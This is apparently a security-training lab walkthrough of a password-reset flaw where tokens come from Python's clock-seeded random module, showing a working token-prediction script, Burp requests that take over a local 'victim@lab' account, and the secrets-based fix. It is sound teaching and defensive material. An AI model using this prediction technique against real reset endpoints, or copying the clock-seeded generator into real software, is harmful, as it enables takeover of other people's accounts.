# Walkthrough — weak-password-reset

The app is a small account API with a forgot-password flow: `POST /forgot` issues a **reset token** and "emails" it to the account owner, and `POST /reset` lets whoever presents that token set a new password. The flow is correct — whoever holds a valid token may reset the password, which is exactly how forgot-password is supposed to work. The problem is how the token is generated: with Python's `random` module, **seeded from the clock**. `random` is deterministic from its seed, and the seed — the server's time in whole seconds — is handed to you for free in the HTTP `Date` response header. Re-seed with it, run the same generator, and you reproduce the token the server generated for the victim.

The track is **Burp Suite (Repeater)** for every request, plus one short **local script** that reproduces the token — reproducing a PRNG's output is something Burp can't do, so, the same way a browser runs JavaScript for a client-side bug, the tool that does that part of the job joins the primary track. There is no browser. The proof is a `POST /login` as the victim, with a password the *attacker* chose.

## 1. Context

A small account API on `127.0.0.1:8037` (vulnerable) and `127.0.0.1:8137` (fixed):

- `GET /` — a JSON banner. Not the target.
- `POST /login` — JSON `{"email", "password"}`. Verifies against the stored password hash; returns `200 {"authenticated": true}` or `401`. This is the **proof** of takeover.
- `POST /forgot` — JSON `{"email"}`. If the account exists, generates a reset token, stores `token → email`, and "emails" the token to the owner. Responds **generically** (`"If that account exists, a reset link has been sent."`) — it never returns the token and never reveals whether the account exists.
- `POST /reset` — JSON `{"token", "new_password"}`. If the token is valid, sets the new password for **the token's owner**.

This atom is **A07 — Identification and Authentication Failures**: the mechanism that recovers a credential generates that credential in a guessable way.

Terms, defined once:

- **Password-reset flow.** The forgot-password mechanism. A user who cannot prove the old password (they forgot it) recovers the account by *requesting* a reset with their email, *receiving* a token out-of-band (by email), and *presenting* that token to set a new password. Three steps: request → receive token → set new password.
- **Reset token = a temporary credential.** The token — not the old password, not a session — is what proves you own the account *for this reset*. Whoever holds a valid token may change the password, so the token **is** the authorization. It is a **credential** (a proof of identity) that is **temporary** (short-lived, meant to be used once). If an attacker learns the token, then to the server he simply *is* the account owner.
- **Entropy / unpredictability.** Entropy measures how unpredictable a value is — how many guesses, on average, it would take to hit it. A secret is safe only with high entropy: so many possibilities that guessing is infeasible. A reset token *must* be unguessable, because guessing it **is** taking over the account. Low or predictable entropy kills the secret, however long it looks.
- **PRNG vs CSPRNG.** A **PRNG** (pseudo-random number generator) computes "random" numbers from a starting value by a formula. It *looks* random but is **deterministic**: same seed, same sequence, every time — great for simulations, wrong for secrets. A **CSPRNG** (cryptographically secure PRNG) is built for security: its output is unpredictable even to someone who has seen earlier outputs, and it seeds itself from operating-system entropy (`os.urandom`). In Python, **`random` is a PRNG** and **`secrets` is the CSPRNG** — that difference is the whole atom.
- **Seed.** The initial value that determines a PRNG's *entire* sequence. Call `random.seed(X)` and the next `random.*` calls always produce the same sequence for the same `X`. The sharp consequence: **if the seed is predictable, the whole sequence is.** Seeding with `int(time.time())` — the clock in seconds — seeds with a value anyone can compute, including from the `Date` header.
- **Mersenne Twister.** The algorithm behind Python's `random`. Statistically excellent (ideal for simulations) and **explicitly not cryptographic** — the Python docs say plainly: do not use `random` for security, use `secrets`. Given the seed (or enough outputs), its internal state is recoverable and its sequence reproducible. Deterministic by design — the opposite of what a secret needs.
- **Single-use / expiry.** A well-made reset token dies **after use** (single-use: once it changed the password, it is worthless) and **after a short time** (expiry: valid for a few minutes). These limit how long a leaked token is useful. They are token *hygiene* — part of a complete fix — but not this atom's central flaw, which is predictability.

## 2. Spot the bug

Open [`vulnerable/app.py`](./vulnerable/app.py) and read the token generator:

```python
ALPHABET = string.ascii_letters + string.digits
TOKEN_LEN = 32

def make_reset_token():
    random.seed(int(time.time()))
    return "".join(random.choice(ALPHABET) for _ in range(TOKEN_LEN))
```

The reset flow around it is correct: the token is stored against its owner, and `POST /reset` changes the password of *the token's owner* — there is no user id in the request body to tamper with. The audit question is not "does the flow check the token?" — it does. It is **"where does the randomness of this secret come from?"** Here it comes from a **PRNG seeded with the clock** — and the clock is in the `Date` header. Everything the attack needs is in those two lines: the generator is `random` (reproducible from its seed), and the seed is `int(time.time())` (readable off any response). The fix (section 7) is a different generator.

## 3. Baseline — the flow working

First, the legitimate flow, so you know what "normal" looks like. A real user resets their *own* password. Point Burp at `127.0.0.1:8037` and request a reset for `attacker@lab` (an account you control):

```
POST /forgot HTTP/1.1
Host: 127.0.0.1:8037
Content-Type: application/json

{"email": "attacker@lab"}
```

```
HTTP/1.1 200 OK
{"message":"If that account exists, a reset link has been sent."}
```

The token was "emailed." In this lab, "emailed" means printed to the server log — that is your **inbox**. Read it (`docker compose logs vulnerable`):

```
vulnerable-1  | [reset-email] to=attacker@lab token=NEHcwezLDbE416JOrlzlw5R7ThtUyZt4
```

Now present that token to `POST /reset`, then log in with the new password:

```
POST /reset HTTP/1.1
Host: 127.0.0.1:8037
Content-Type: application/json

{"token": "NEHcwezLDbE416JOrlzlw5R7ThtUyZt4", "new_password": "legit-new-pw"}
```

```
HTTP/1.1 200 OK
{"reset":true}
```

`POST /login` with `{"email":"attacker@lab","password":"legit-new-pw"}` → `200 {"authenticated":true}`. The flow works. Note that for your *own* account you read the token from your *own* inbox. The attack below never touches the victim's inbox — it computes her token.

## 4. Exploitation via Burp Suite (primary track)

Now the attack. The target is `victim@lab`, an account you do **not** control and whose inbox you cannot read.

### Step 1 — AS ATTACKER: request the victim's reset and read the clock

```
POST /forgot HTTP/1.1
Host: 127.0.0.1:8037
Content-Type: application/json

{"email": "victim@lab"}
```

```
HTTP/1.1 200 OK
Date: Thu, 10 Sep 2026 13:50:01 GMT
Content-Type: application/json

{"message":"If that account exists, a reset link has been sent."}
```

The body tells you nothing — it is generic on purpose, and the token went to the victim's inbox, not to you. But look at the **`Date` header**: `Thu, 10 Sep 2026 13:50:01 GMT`. That is the server's clock, to the second — and the server seeded the token generator with `int(time.time())` at that same second. The seed is `13:50:01 GMT`.

### Step 2 — AS ATTACKER: reproduce the token locally

The token is not random to anyone who knows the generator and the seed. This short script runs the **same** `random.seed()` + `random.choice()` the server ran, re-seeded from the `Date` header. It sweeps a small window of seconds to absorb any clock skew between token generation and the response being dated (a one-second miss changes the whole token, so the window is not optional):

```python
#!/usr/bin/env python3
# Reproduce the server's predictable reset token. It runs the SAME generator the app runs,
# re-seeded from the clock the app used -- which the /forgot response handed us in the Date header.
import sys, random, string, calendar, email.utils

ALPHABET = string.ascii_letters + string.digits   # must match the server's generator
TOKEN_LEN = 32

def predict(seed):
    random.seed(seed)                              # same seed -> same Mersenne Twister sequence
    return "".join(random.choice(ALPHABET) for _ in range(TOKEN_LEN))

date_header = sys.argv[1]                           # the Date: header from the /forgot response
t = calendar.timegm(email.utils.parsedate(date_header))   # HTTP date (GMT) -> epoch seconds
for seed in range(t - 3, t + 4):                   # sweep +/-3s to absorb clock skew
    print(seed, predict(seed))
```

Run it with the `Date` value:

```
$ python3 predict.py "Thu, 10 Sep 2026 13:50:01 GMT"
1789048198 V0b1XNfDHul8RKdjoAB7jgdVIfi8kMkR
1789048199 jB6ANsb690srPhCIXIndNUtEIrvCEqVY
1789048200 SdrUM0m9eeFRwH9lqJyzevl4BgF0B8rQ
1789048201 N8c1UBJwiHypnOeNts2fStuCLbAGJH8F
1789048202 VVhUja8QhZmVyatC7w76Ao9RrOSGxg5b
1789048203 MVVld0VfTnE9B7NAHEH80aAgxI4hh9hd
1789048204 SkPNYuVzHrEtOOTUX4xLrlMKKmucStq7
```

Seven candidates, one per second in the window. The token for the exact second the response was dated (epoch `1789048201`) is `N8c1UBJwiHypnOeNts2fStuCLbAGJH8F`. (You did not read this from anywhere — you *computed* it. In this lab you can confirm it is byte-for-byte the token the server "emailed" to the victim, but the attacker never needs the inbox.)

### Step 3 — AS ATTACKER: reset the victim's password

Feed each candidate to `POST /reset` (in Repeater, or with Intruder over the seven) until one is accepted. The `1789048201` token is:

```
POST /reset HTTP/1.1
Host: 127.0.0.1:8037
Content-Type: application/json

{"token": "N8c1UBJwiHypnOeNts2fStuCLbAGJH8F", "new_password": "pwned-by-attacker"}
```

```
HTTP/1.1 200 OK
{"reset":true}
```

Accepted. The victim's password is now `pwned-by-attacker` — a value **you** chose.

### Step 4 — AS ATTACKER: log in as the victim (the proof)

```
POST /login HTTP/1.1
Host: 127.0.0.1:8037
Content-Type: application/json

{"email": "victim@lab", "password": "pwned-by-attacker"}
```

```
HTTP/1.1 200 OK
{"authenticated":true}
```

**Account takeover.** You are logged in as the victim with a password you set. You never saw her old password, never read her inbox, never guessed blindly — you *predicted* the reset token, because the generator that made it is predictable.

> This is a local lab: both apps bind to `127.0.0.1`, the users and passwords are dummy (`victim@lab`, `attacker@lab`, obviously fake lab passwords), and the "exploit" is a script that runs the same `random` the server runs — nothing here leaves the box and nothing is destructive. On a real target this is account takeover of any account whose reset you can request.

## 5. What the vuln is NOT

Five wrong conclusions to kill. Each keeps this atom distinct from a neighbour.

**It is NOT IDOR.** The predicted token is not the id of an object you access under a missing access-control check. It is the **authentication secret** itself. `POST /reset` acts on the *token's owner*, and there is no user id in the request to swap — predicting the token *is* becoming the victim, not reaching her resource past a broken guard. (Contrast [`idor-numeric-id`](../../A01-broken-access-control/idor-numeric-id/), where you change an object's id and the server hands you someone else's record because it never checked ownership.)

**It is NOT a crypto atom.** Nothing is cracked. No hash is reversed, no cipher is broken, no key is brute-forced. The token is *reproduced* because its generator is deterministic and its seed is observable. That is a flaw in how the authentication flow was **designed**, not in a cryptographic primitive — which is why it is A07, not A02. (Contrast [`crypto-weak-hash`](../../A02-cryptographic-failures/crypto-weak-hash/), where you crack a stored password hash offline.)

**It is NOT "missing authentication."** The flow authenticates correctly — by possession of the token, exactly as forgot-password should. The attacker does not bypass a check; he *satisfies* the check, with the right token, which he computed. The hole is that the right token is computable.

**It is NOT "the token is too short."** Making a *predictable* generator produce a longer token does not help: once you reproduce the seed, you generate the entire token, whatever its length. The weakness is **predictability**, not size. A 128-character clock-seeded token falls to the exact same script.

**It is NOT "the token just needed an expiry (or single use)."** The central hole is predictability. Adding an expiry to a *predictable* token only gives the attacker a window — and he predicts and uses the token inside it, immediately, as above. Single-use and expiry are hygiene the fixed side also adds, but they are not what defeats this attack (section 7).

And, anchoring on the sibling: unlike [`session-fixation`](../session-fixation/) — where the session id is *strong* (`secrets.token_urlsafe`) and the bug is that it survives the login — here the secret is *weak/predictable*, and that **is** the bug. Session fixation's own notes say a predictable id "would be a different bug"; this is that different bug.

What it **is**, surgically: the reset token — a temporary credential — is generated by a PRNG seeded with an observable value (the clock, via `Date`), so it is reproducible; the attacker regenerates the victim's token and resets her password. Change the generator and the attack dies — which is exactly what the fix does.

## 6. Impact

Account takeover. From nothing but the victim's email address and a response header, the attacker sets the victim's password and logs in as her — reading her account, acting as her. It is **not** RCE, and the attacker never learns the old password; the power comes entirely from the reset token being computable. On a real target the same predictability applies to *any* account whose reset the attacker can request, which usually means every account.

## 7. Why the fix works (port 8137)

Run the same attack against the fixed API at `127.0.0.1:8137`.

Request the victim's reset and read the `Date` header, exactly as before:

```
POST /forgot HTTP/1.1
Host: 127.0.0.1:8137
Content-Type: application/json

{"email": "victim@lab"}
```

```
HTTP/1.1 200 OK
Date: Thu, 10 Sep 2026 13:50:02 GMT

{"message":"If that account exists, a reset link has been sent."}
```

Run the **same** predictor on the new `Date` and feed every candidate in the window to `POST /reset`:

```
{"token": "<each predicted token, seeds t-3 .. t+3>", "new_password": "pwned-by-attacker"}
```

```
HTTP/1.1 400 BAD REQUEST
{"reset":false}
```

Every one — all seven seconds of the window — is rejected. `POST /login {"email":"victim@lab","password":"pwned-by-attacker"}` returns `401`: **no takeover.** The fixed generator is:

```python
def make_reset_token():
    return secrets.token_urlsafe(32)
```

`secrets.token_urlsafe(32)` draws from a **CSPRNG** (`os.urandom`) — ~256 bits of unpredictable entropy, with no seed the attacker can reproduce. The `Date` header still reveals the second, but there is no seed to feed it into: the token came from operating-system entropy, not a clock-seeded PRNG. The actual token the fixed server "emailed" this run was `p0AFCrZy7n3U3xvffI7DKAkqCPUeGRTUhZKrkubBiE8` — a value nothing in the response narrows down. This is the **same generator `session-fixation` uses for its session ids.**

Notice *where* the predicted token fails on the fixed side: at `POST /reset`, as an **unknown token** — it was never in the store, because `secrets` generated something else entirely. The fixed side also makes tokens single-use and short-lived (defense in depth for a token that is *already* unpredictable), but those never even come into play against a predicted token: an unknown token is rejected before expiry or single-use are consulted. The decisive change is the **unpredictable generator**, full stop.

The isolation proof: the legitimate self-service reset from section 3 works **identically** on both ports — request, read your own inbox, reset, log in, `200` on each side. Only *predicting the victim's token* separates them, and that difference traces purely to the generator. See [`DIFF.md`](./DIFF.md) for the diff and why "a longer token" and "a better seed" are both the wrong fix.
